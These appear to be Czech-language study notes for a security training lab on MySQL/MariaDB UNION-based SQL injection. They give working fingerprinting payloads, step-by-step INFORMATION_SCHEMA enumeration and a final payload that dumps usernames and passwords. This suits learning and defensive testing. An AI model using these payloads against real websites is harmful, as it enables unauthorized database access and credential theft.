## 🔍 1. Fingerprinting databáze

Před sestavením konkrétních dotazů je nutné ověřit typ databázového stroje (DBMS), protože syntaxe se mezi systémy liší.

|**Metoda / Payload**|**Kdy použít**|**Očekávaný výstup (MySQL / MariaDB)**|**Význam**|
|---|---|---|---|
|**`SELECT @@version`**|Při přímém výstupu na stránce|Verze databáze (např. `10.3.22-MariaDB`)|Potvrdí MySQL/MariaDB.|
|**`SELECT POW(1,1)`**|Pouze při číselném výstupu|Vrátí hodnotu `1`|Matematická funkce specifická pro MySQL.|
|**`SELECT SLEEP(5)`**|Slepá SQLi (Blind SQLi)|Zpoždění odpovědi o 5 sekund|Ověří MySQL bez přímého výstupu.|

## 🗄️ 2. Systémová databáze `INFORMATION_SCHEMA`

Datový sklad `INFORMATION_SCHEMA` obsahuje metadata o všech databázích, tabulkách a sloupcích na serveru. Je klíčovým nástrojem pro exfiltraci dat.

> 💡 **Tečková notace:** Pokud chceme přistoupit k tabulce v jiné databázi, používáme zápis `databaze.tabulka` (např. `dev.credentials`).

## 🗺️ 3. Postup enumerace krok za krokem

```
SCHEMATA (Seznam DB) ──> TABLES (Seznam tabulek) ──> COLUMNS (Seznam sloupců) ──> EXFILTRACE DAT
```

### Krok 1: Výpis všech databází (`SCHEMATA`)

Názvy databází získáme ze sloupce `SCHEMA_NAME`:

SQL

```
cn' UNION SELECT 1, schema_name, 3, 4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
```

_(Výchozí databáze jako `mysql`, `information_schema` a `performance_schema` při analýze obvykle ignorujeme)._

Zjištění aktuální databáze: `UNION SELECT 1, database(), 3, 4-- -`

### Krok 2: Výpis tabulek v konkrétní databázi (`TABLES`)

Známe-li název databáze (např. `dev`), načteme její tabulky filtrem `table_schema='dev'`:

SQL

```
cn' UNION SELECT 1, TABLE_NAME, TABLE_SCHEMA, 4 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='dev'-- -
```

_Navrácené tabulky:_ `credentials`, `framework`, `pages`, `posts`.

### Krok 3: Výpis sloupců vybrané tabulky (`COLUMNS`)

Pro zjištění názvů sloupců v tabulce `credentials` použijeme tabulku `COLUMNS` a filtr `table_name='credentials'`:

SQL

```
cn' UNION SELECT 1, COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='credentials'-- -
```

_Navrácené sloupce:_ `username`, `password`.

### Krok 4: Získání samotných dat (Exfiltrace)

Máme-li kompletní cestu (`dev.credentials`) a názvy sloupců (`username`, `password`), sestavíme finální UNION dotaz pro čtení citlivých údajů:

SQL

```
cn' UNION SELECT 1, username, password, 4 FROM dev.credentials-- -
```